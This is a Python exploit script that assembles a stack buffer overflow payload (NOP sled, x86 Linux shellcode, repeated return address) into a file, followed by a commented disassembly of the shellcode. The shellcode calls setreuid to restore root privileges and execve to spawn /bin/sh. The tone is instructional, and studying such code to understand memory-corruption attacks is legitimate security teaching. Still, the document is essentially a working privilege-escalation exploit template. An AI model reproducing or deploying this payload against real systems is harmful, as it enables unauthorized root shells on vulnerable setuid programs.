#!/usr/bin/env python
import struct, sys

nopsled = "\x90" * 4 # adjust the length of the nopsled here

# we use struct.pack to write the return address in little endian
# http://en.wikipedia.org/wiki/Endianness
#
# change 0xbfffffff to the address of the buffer causing the overflow
rets = struct.pack("<L", 0xbfffffff) * 4  

# see below for details about the shellcode
shellcode = "\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68"

# putting it all together
code = nopsled + shellcode + rets


# write out the code to block.txt
with open('block.txt', 'w') as fd:
    fd.write(code)



### SHELLCODE DETAILS
###
### the shellcode makes two system calls:
### setreuid() and execve()
###
### system calls are calls into the kernel.
### they are invoked not by the call instuction, 
### but by  issuing the software interrupt int 0x80
### 
### setreuid restores root privileges if
### the are dropped
###
### execve spawns a shell when given the
### string /bin/sh as an argument
###
### the shellcode bytes are the result of 
### assembling the following assembly code:
###
### 31 C0                        xor eax, eax          ; eax = 0
### B0 46                        mov al, 0x46          ; setreuid is syscall 0x46
### 31 DB                        xor ebx, ebx          ; ebx = 0
### 31 C9                        xor ecx, ecx          ; ecx = 0
### CD 80                        int 0x80              ; call the kernel
### EB 16                        jmp 0x00000022        ; jump down to call 0x0000000C
### 5B                           pop ebx               ; pop a value from the stack into ebx
### 31 C0                        xor eax, eax          ; eax = 0
### 88 43 07                     mov [ebx+0x7], al     ; put a NULL at the end of "/bin/sh"
### 89 5B 08                     mov[ebx+0x8], ebx     ; put the address of "/bin/sh" after the string
### 89 43 0C                     mov[ebx+0xC], eax     ; put 4 null bytes after the address
### B0 0B                        mov al, 0x0B          ; execve is syscall 0x0b
### 8D 4B 08                     lea ecx, [ebx+0x8]    ; load the address where the address of "/bin/sh" is  
### 8D 53 0C                     lea edx, [ebx+0xC]    ; load the address where the 4 null bytes are
### CD 80                        int 0x80              ; call the kernel
### E8 E5 FF FF FF               call 0x0000000C       ; call the address where pop ebx is
### 2F 62 69 6E 2F 73 68         "/bin/sh"             ; the string "/bin/sh", not null terminated
